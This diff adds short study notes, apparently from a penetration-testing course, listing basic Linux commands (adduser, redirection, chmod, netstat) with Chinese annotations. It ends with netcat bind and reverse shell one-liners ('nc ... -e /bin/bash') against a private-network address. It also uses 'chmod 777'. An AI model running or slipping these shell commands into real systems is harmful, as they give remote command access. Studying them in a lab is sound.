@@ -1,0 +1,31 @@
+pwd
+cd ..
+man ls
+adduser georgia
+adduser georgia sudo
+su georgia
+touch myfile 产生一个空文件
+mkdir mydir
+cp /root/myfile myfile2
+echo hello georgia
+echo hello georgia > myfile   替换
+echo hello georgia1 >> myfile 加在后面
+ls -la
+chmod 777 myfile
+grep
+sed
+service apache2 start
+ifconfig
+route
+netstat -antp
+nc -nv 192.168.31.100 80
+nc -nlvp 1234 等待1234端口连接
+
+nc -nlvp 1234 -e /bin/bash
+nc -nv 192.168.31.100 1234
+
+nc -nlvp 1234
+nc -nv 192.168.31.100 1234 -e /bin/bash
+
+cron 定时任务
+
